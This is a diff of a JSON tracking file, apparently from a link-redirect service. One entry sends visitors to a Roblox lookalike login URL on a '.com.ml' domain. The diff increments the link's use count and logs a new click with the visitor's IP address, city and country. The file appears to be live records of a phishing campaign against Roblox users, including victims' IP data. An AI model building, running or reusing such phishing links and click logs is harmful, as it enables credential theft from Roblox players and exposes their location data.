@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 462,
+    "useCount": 463,
     "createdBy": "admin",
     "clicks": [
       {
@@ -3808,6 +3808,14 @@
         "city": "Lima",
         "flag": "🇵🇪",
         "countryCode": "PE"
+      },
+      {
+        "timestamp": 1777070928028,
+        "ip": "136.34.111.118",
+        "country": "United States",
+        "city": "Kansas City",
+        "flag": "🇺🇸",
+        "countryCode": "US"
       }
     ]
   },
